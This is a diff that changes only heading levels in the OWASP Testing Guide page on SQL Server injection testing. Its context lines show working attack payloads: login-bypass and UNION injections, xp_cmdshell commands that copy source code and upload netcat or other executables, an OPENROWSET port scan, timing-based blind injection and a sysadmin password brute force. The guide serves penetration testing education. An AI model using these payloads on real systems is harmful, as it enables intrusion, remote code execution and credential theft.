@@ -1,6 +1,6 @@
 # SQL Server Testing
 
-## Summary
+### Summary
 In this section some [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) techniques that utilize specific features of Microsoft SQL Server will be discussed.
 
 SQL injection vulnerabilities occur whenever input is used in the construction of an SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers and execute SQL code under the privileges of the user used to connect to the database.
@@ -18,9 +18,9 @@ As explained in [SQL injection](https://www.owasp.org/index.php/SQL_Injection), 
 Microsoft SQL server has a few unique characteristics, so some exploits need to be specially customized for this application.
 
 
-## How to Test
+### How to Test
 
-### SQL Server Characteristics
+#### SQL Server Characteristics
 
 To begin, let's see some SQL Server operators and commands/stored procedures that are useful in a SQL Injection test:
 
@@ -80,7 +80,7 @@ Information gathering is useful for exploiting software vulnerabilities at the S
 In the following, we show several examples that exploit SQL injection vulnerabilities through different entry points.
 
 
-### Example 1: Testing for SQL Injection in a GET request.
+#### Example 1: Testing for SQL Injection in a GET request.
 
 The most simple (and sometimes most rewarding) case would be that of a login page requesting an user name and password for user login. You can try entering the following string "' or '1'='1" (without double quotes):
 ```
@@ -89,14 +89,14 @@ The most simple (and sometimes most rewarding) case would be that of a login pag
 If the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application.
 
 
-### Example 2: Testing for SQL Injection in a GET request
+#### Example 2: Testing for SQL Injection in a GET request
 
 In order to learn how many columns exist
 ```
  https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--
 ```
 
-### Example 3: Testing in a POST request
+#### Example 3: Testing in a POST request
 
 SQL Injection, HTTP POST Content: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`
 
@@ -124,14 +124,14 @@ The error message obtained when a ' (single quote) character is entered at the e
  /forgotpass.asp, line 15
 ```
 
-### Example 4: Yet another (useful) GET example
+#### Example 4: Yet another (useful) GET example
 
 Obtaining the application's source code
 ```
  a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--
 ```
 
-### Example 5: custom xp_cmdshell
+#### Example 5: custom xp_cmdshell
 
 All books and papers describing the security best practices for SQL Server recommend disabling xp_cmdshell in SQL Server 2000 (in SQL Server 2005 it is disabled by default). However, if we have sysadmin rights (natively or by bruteforcing the sysadmin password, see below), we can often bypass this limitation.
 <br><br>
@@ -167,7 +167,7 @@ reconfigure
 ```
 
 
-### Example 6: Referer / User-Agent
+#### Example 6: Referer / User-Agent
 
 The REFERER header set to:
 ```
@@ -178,7 +178,7 @@ Allows the execution of arbitrary SQL Code. The same happens with the User-Agent
  User-Agent: user_agent', 'some_ip'); [SQL CODE]--
 ```
 
-### Example 7: SQL Server as a port scanner
+#### Example 7: SQL Server as a port scanner
 
 In SQL Server, one of the most useful (at least for the penetration tester) commands is OPENROWSET, which is used to run a query on another DB Server and retrieve the results. The penetration tester can use this command to scan ports of other machines in the target network, injecting the following query:
 ```
@@ -206,7 +206,7 @@ Of course, the error message is not always available. If that is the case, we ca
 Keep in mind that OPENROWSET is enabled by default in SQL Server 2000 but disabled in SQL Server 2005.
 
 
-### Example 8: Upload of executables
+#### Example 8: Upload of executables
 
 Once we can use xp_cmdshell (either the native one or a custom one), we can easily upload executables on the target DB Server. A very common choice is netcat.exe, but any trojan will be useful here.
 If the target is allowed to start FTP connections to the tester's machine, all that is needed is to inject the following queries:
@@ -238,7 +238,7 @@ exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
 At this point, our executable is available on the target machine, ready to be executed. There are tools that automate this process, most notably Bobcat, which runs on Windows, and Sqlninja, which runs on Unix (See the tools at the bottom of this page).
 
 
-### Obtain information when it is not displayed (Out of band)
+#### Obtain information when it is not displayed (Out of band)
 
 Not all is lost when the web application does not return any information --such as descriptive error messages (cf. [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)). For example, it might happen that one has access to the source code (e.g., because the web application is based on an open source software). Then, the pen tester can exploit all the SQL injection vulnerabilities discovered offline in the web application. Although an IPS might stop some of these attacks, the best way would be to proceed as follows: develop and test the attacks in a testbed created for that purpose, and then execute these attacks against the web application being tested.
 
@@ -246,9 +246,9 @@ Not all is lost when the web application does not return any information --such 
 Other options for out of band attacks are described in Sample 4 above.
 
 
-### Blind SQL injection attacks
+#### Blind SQL injection attacks
 
-#### Trial and error
+##### Trial and error
 Alternatively, one may play lucky. That is the attacker may assume that there is a blind or out-of-band SQL injection vulnerability in a the web application. He will then select an attack vector (e.g., a web entry), use [fuzz vectors](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors) against this channel and watch the response. For example, if the web application is looking for a book using a query
 ```
    select * from books where title=text entered by the user
@@ -256,7 +256,7 @@ Alternatively, one may play lucky. That is the attacker may assume that there is
 then the penetration tester might enter the text: **'Bomba' OR 1=1-** and if data is not properly validated, the query will go through and return the whole list of books. This is evidence that there is a SQL injection vulnerability. The penetration tester might later *play* with the queries in order to assess the criticality of this vulnerability.
 
 
-#### If more than one error message is displayed
+##### If more than one error message is displayed
 On the other hand, if no prior information is available, there is still a possibility of attacking by exploiting any *covert channel*. It might happen that descriptive error messages are stopped, yet the error messages give some information. For example:
 
 * In some cases the web application (actually the web server) might return the traditional *500: Internal Server Error*, say when the application returns an exception that might be generated, for instance, by a query with unclosed quotes.
@@ -266,7 +266,7 @@ On the other hand, if no prior information is available, there is still a possib
 This one bit of information might be enough to understand how the dynamic SQL query is constructed by the web application and tune up an exploit. Another out-of-band method is to output the results through HTTP browseable files.
 
 
-#### Timing attacks
+##### Timing attacks
 There is one more possibility for making a blind SQL injection attack when there is not visible feedback from the application: by measuring the time that the web application takes to answer a request. An attack of this sort is described by Anley in ([2]) from where we take the next examples. A typical approach uses the *waitfor delay* command: let's say that the attacker wants to check if the 'pubs' sample database exists, he will simply inject the following command:
 ```
  if exists (select * from pubs..pub_info) waitfor delay '0:0:5'
@@ -297,7 +297,7 @@ However, it might happen that the command *waitfor* is not available (e.g., beca
  end
 ```
 
-#### Checking for version and vulnerabilities
+##### Checking for version and vulnerabilities
 The same timing approach can be used also to understand which version of SQL Server we are dealing with. Of course we will leverage the built-in @@version variable. Consider the following query:
 ```
  select @@version
@@ -316,7 +316,7 @@ The '2005' part of the string spans from the 22nd to the 25th character. Therefo
 Such query will wait 5 seconds if the 25th character of the @@version variable is '5', showing us that we are dealing with a SQL Server 2005. If the query returns immediately, we are probably dealing with SQL Server 2000, and another similar query will help to clear all doubts.
 
 
-### Example 9: bruteforce of sysadmin password
+#### Example 9: bruteforce of sysadmin password
 
 To bruteforce the sysadmin password, we can leverage the fact that OPENROWSET needs proper credentials to successfully perform the connection and that such a connection can be also "looped" to the local DB Server.
 Combining these features with an inferenced injection based on response timing, we can inject the following code:
@@ -338,13 +338,13 @@ Once we have the sysadmin password, we have two choices:
 Remember that OPENROWSET is accessible to all users on SQL Server 2000 but it is restricted to administrative accounts on SQL Server 2005.
 
 
-## Tools
+### Tools
 * Francois Larouche: Multiple DBMS SQL Injection tool - [[SQL Power Injector](http://www.sqlpowerinjector.com/index.htm)]
 * Northern Monkee: [[Bobcat](http://www.northern-monkee.co.uk/projects/bobcat/bobcat.html)]
 * icesurfer: SQL Server Takeover Tool - [[sqlninja](http://sqlninja.sourceforge.net)]
 * Bernardo Damele A. G.: sqlmap, automatic SQL injection tool - http://sqlmap.org/
 
-## References
+### References
 **Whitepapers**<br>
 * David Litchfield: "Data-mining with SQL Injection and Inference" - http://www.databasesecurity.com/webapps/sqlinference.pdf
 * Chris Anley, "(more) Advanced SQL Injection" - http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf
